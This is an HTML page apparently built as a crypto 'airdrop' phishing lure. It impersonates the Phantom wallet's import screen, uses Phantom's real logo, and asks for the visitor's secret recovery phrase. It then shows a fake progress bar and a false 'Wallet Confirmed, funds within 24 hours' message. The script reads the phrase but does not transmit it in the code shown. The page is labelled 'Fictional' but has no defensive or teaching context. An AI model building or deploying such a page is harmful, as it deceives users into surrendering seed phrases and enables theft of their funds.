# Phantom-Airdrop

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Phantom Wallet - Import (Fictional)</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
  body, html {
    margin: 0; padding: 0;
    height: 100%;
    font-family: 'Inter', sans-serif;
    background: linear-gradient(160deg, #1e004c, #2d0066);
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }
  .container {
    max-width: 400px;
    width: 90vw;
    background: rgba(255 255 255 / 0.05);
    padding: 40px 30px;
    border-radius: 12px;
    box-shadow: 0 0 20px #000;
    text-align: center;
    opacity: 1;
    transition: opacity 0.5s ease;
    position: relative;
  }
  img.logo {
    width: 60px;
    margin-bottom: 20px;
  }
  textarea {
    width: 100%;
    border-radius: 8px;
    border: none;
    padding: 12px;
    font-size: 16px;
    resize: none;
    margin-top: 15px;
    background: rgba(255 255 255 / 0.1);
    color: white;
  }
  textarea::placeholder {
    color: #ddd;
  }
  button {
    margin-top: 25px;
    padding: 14px 28px;
    background-color: #6c5ce7;
    border: none;
    border-radius: 8px;
    color: white;
    font-size: 18px;
    font-weight: 700;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #5946c8;
  }

  /* Screens hidden by default except input */
  #loadingScreen, #confirmationScreen {
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0 0 0 / 0.7);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.6s ease;
  }
  #loadingScreen.active, #confirmationScreen.active {
    opacity: 1;
    pointer-events: auto;
  }

  #loadingText {
    font-size: 24px;
    margin-bottom: 30px;
    font-weight: 600;
  }
  #progressBarContainer {
    width: 100%;
    height: 14px;
    background: rgba(255 255 255 / 0.2);
    border-radius: 10px;
    overflow: hidden;
    margin-bottom: 25px;
  }
  #progressBar {
    width: 0%;
    height: 100%;
    background: #6c5ce7;
    transition: width 0.25s linear;
  }
  #timer {
    font-size: 20px;
    letter-spacing: 1.2px;
  }

  /* Confirmation checkmark */
  .checkmark-circle {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    background: #2ecc71;
    position: relative;
    margin-bottom: 30px;
    animation: popIn 0.6s ease forwards;
  }
  .checkmark {
    position: absolute;
    top: 30px;
    left: 37px;
    width: 50px;
    height: 85px;
    border-right: 6px solid white;
    border-bottom: 6px solid white;
    transform: rotate(45deg);
    opacity: 0;
    animation: draw 0.6s ease forwards 0.6s;
  }
  @keyframes popIn {
    0% { transform: scale(0); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
  }
  @keyframes draw {
    0% { width: 0; height: 0; opacity: 0; }
    100% { width: 50px; height: 85px; opacity: 1; }
  }
  #confirmationScreen h1 {
    font-size: 28px;
    margin-bottom: 12px;
  }
  #confirmationScreen p {
    font-size: 18px;
    color: #b6f4c7;
  }
</style>
</head>
<body>

<div class="container" id="inputScreen">
  <img class="logo" src="https://docs.phantom.com/~gitbook/image?url=https%3A%2F%2F187760183-files.gitbook.io%2F~%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MVOiF6Zqit57q_hxJYp%252Ficon%252FU7kNZ4ygz4QW1rUwOuTT%252FWhite%2520Ghost_docs_nu.svg%3Falt%3Dmedia%26token%3D447b91f6-db6d-4791-902d-35d75c19c3d1&width=48&height=48&sign=23b24c2a&sv=2" alt="Phantom Logo" />
  <h1>Import Wallet</h1>
  <p>Securely access your existing wallet using your Secret Recovery Phrase.</p>
  <textarea id="phrase" rows="4" placeholder="Enter your 12 or 24-word phrase..."></textarea>
  <button onclick="startLoading()">Continue</button>
</div>

<div id="loadingScreen">
  <div id="loadingText">Processing… Please wait</div>
  <div id="progressBarContainer"><div id="progressBar"></div></div>
  <div id="timer">10s</div>
</div>

<div id="confirmationScreen">
  <div class="checkmark-circle">
    <div class="checkmark"></div>
  </div>
  <h1>Wallet Confirmed</h1>
  <p>Your funds will be available within 24 hours.</p>
</div>

<script>
  const inputScreen = document.getElementById('inputScreen');
  const loadingScreen = document.getElementById('loadingScreen');
  const confirmationScreen = document.getElementById('confirmationScreen');
  const progressBar = document.getElementById('progressBar');
  const timer = document.getElementById('timer');

  function startLoading() {
    const phrase = document.getElementById('phrase').value.trim();
    if (!phrase) {
      alert('Please enter your seed phrase.');
      return;
    }

    // Hide input, show loading
    inputScreen.style.opacity = 0;
    setTimeout(() => {
      inputScreen.style.display = 'none';
      loadingScreen.classList.add('active');
      runLoadingTimer(10); // 10 seconds
    }, 500);
  }

  function runLoadingTimer(seconds) {
    let timeLeft = seconds;
    progressBar.style.width = '0%';
    timer.textContent = `${timeLeft}s`;

    const interval = setInterval(() => {
      timeLeft--;
      if (timeLeft < 0) {
        clearInterval(interval);
        showConfirmation();
        return;
      }
      timer.textContent = `${timeLeft}s`;
      progressBar.style.width = ((seconds - timeLeft) / seconds) * 100 + '%';
    }, 1000);
  }

  function showConfirmation() {
    loadingScreen.classList.remove('active');
    confirmationScreen.style.opacity = 0;
    confirmationScreen.style.display = 'flex';
    // Fade in confirmation
    setTimeout(() => {
      confirmationScreen.style.opacity = 1;
    }, 50);
  }
</script>

</body>
</html>

</body>
</html>

